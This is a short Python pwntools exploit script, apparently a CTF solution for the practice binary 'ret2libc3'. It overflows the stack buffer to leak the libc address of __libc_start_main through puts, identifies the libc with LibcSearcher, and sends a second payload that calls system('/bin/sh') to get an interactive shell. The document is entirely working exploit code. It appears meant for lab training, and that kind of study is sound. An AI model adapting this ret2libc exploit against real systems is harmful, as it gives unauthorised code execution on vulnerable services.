from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
sh=process('./ret2libc3')
elf=ELF('./ret2libc3')

puts_plt=elf.plt['puts']
__libc_start_main_got=elf.got['__libc_start_main']
main=elf.symbols['main']
print "leak libc_start_main_got addr and return to main again"
payload = flat(['A' * 112, puts_plt, main, __libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload)
print "get the related addr"
libc_start_main_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])

sh.sendline(payload)

sh.interactive()
